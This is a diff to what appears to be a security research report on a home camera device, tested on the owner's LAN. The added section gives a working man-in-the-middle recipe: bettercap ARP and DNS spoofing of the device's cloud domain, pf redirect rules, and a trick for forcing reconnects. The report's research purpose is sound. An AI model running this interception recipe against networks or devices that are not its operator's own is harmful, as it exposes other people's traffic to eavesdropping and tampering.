@@ -36,6 +36,25 @@ forwarding path (the eero drops frames whose source MAC it does not associate wi
 which is why the NAT rule `nat on en1 from 192.168.6.0/24 to any -> 192.168.4.170` was added; the
 relay is a two-line `pf` rule plus `arp.spoof`. (EV-945, EV-947)
 
+**C-8 — reproduction recipe (owner LAN, macOS).** `bettercap` (brew) is the only extra tool.
+
+```bash
+# 1. viewer sits on the same AP; note the current en1 address (it moves: .170 -> .240 observed)
+ipconfig getifaddr en1
+# 2. forward + redirect: translation rules must precede filtering rules in the file
+printf 'rdr pass on en1 inet proto tcp from 192.168.6.85 to any port 443 -> <us> port 443\n' | sudo pfctl -f -
+sudo pfctl -E
+# 3. intercept. beacons first, then modules; order matters (dns.spoof fails 'No Such Device' otherwise)
+ping -c1 192.168.6.85
+sudo bettercap -iface en1 -eval "set arp.spoof.targets 192.168.6.85; set arp.spoof.fullduplex true; \
+  set dns.spoof.domains i.canaryis.com; set dns.spoof.address <us>; arp.spoof on; dns.spoof on; sleep 160"
+# 4. to force a reconnect, block :443 in the filter stage for ~40 s, then remove the block
+```
+
+Caveat: `rdr` alone leaves the device's SYNs in `SYN_SENT` (its kernel expects the original AWS
+destination); DNS spoofing is the reliable variant because the device then dials the viewer's own
+address and no translation is involved.
+
 Structural note on C-2/C-3: the split is diagnostic, not noise. A default-DROP firewall that also
 drops the ICMP unreachable produces `open|filtered` on every UDP port *and* `filtered` on every TCP
 port; here TCP returns RST on 3 231 ports, so the TCP stack is alive and simply has no listener —
